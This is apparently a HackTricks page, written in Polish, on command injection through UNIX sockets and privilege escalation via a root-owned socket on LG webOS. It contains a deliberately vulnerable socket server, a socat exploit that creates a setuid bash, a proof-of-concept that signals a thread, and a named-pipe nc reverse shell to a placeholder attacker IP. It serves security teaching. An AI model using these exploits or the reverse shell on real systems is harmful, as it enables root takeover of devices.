# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Socket binding — przykład w Pythonie

W poniższym przykładzie tworzony jest **unix socket** (`/tmp/socket_test.s`), a wszystko, co zostanie **odebrane**, zostanie **wykonane** przez `os.system`. Wiem, że nie znajdziesz tego w praktyce, ale celem tego przykładu jest pokazanie, jak wygląda kod używający unix socketów i jak poradzić sobie z danymi wejściowymi w najgorszym możliwym przypadku.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Uruchom** kod przy użyciu python: `python s.py` i **sprawdź, jak socket nasłuchuje**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Studium przypadku: Root-owned UNIX socket signal-triggered escalation (LG webOS)

Niektóre uprzywilejowane demony udostępniają root-owned UNIX socket, który przyjmuje niezaufane dane wejściowe i wiąże uprzywilejowane akcje z identyfikatorami wątków i sygnałami. Jeśli protokół pozwala nieuprzywilejowanemu klientowi wpływać na to, który native thread jest celem, możesz być w stanie wywołać uprzywilejowaną ścieżkę kodu i eskalować.

Zaobserwowany wzorzec:
- Połącz się z root-owned socket (np. /tmp/remotelogger).
- Utwórz thread i uzyskaj jego native thread id (TID).
- Wyślij TID (spakowany) plus padding jako żądanie; odbierz potwierdzenie.
- Dostarcz konkretny sygnał do tego TID, aby wywołać uprzywilejowane zachowanie.

Minimalny szkic PoC:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Aby to zamienić w powłokę root, można użyć prostego wzorca named-pipe + nc:
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
Notatki:
- Ten typ błędów wynika z ufania wartościom pochodzącym ze stanu klienta bez uprawnień (TIDs) i wiązania ich z uprzywilejowanymi signal handlers lub logiką.
- Wzmocnić poprzez wymuszanie poświadczeń na socket, walidację formatów wiadomości oraz oddzielenie uprzywilejowanych operacji od zewnętrznie dostarczanych thread identifiers.

## Referencje

- [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
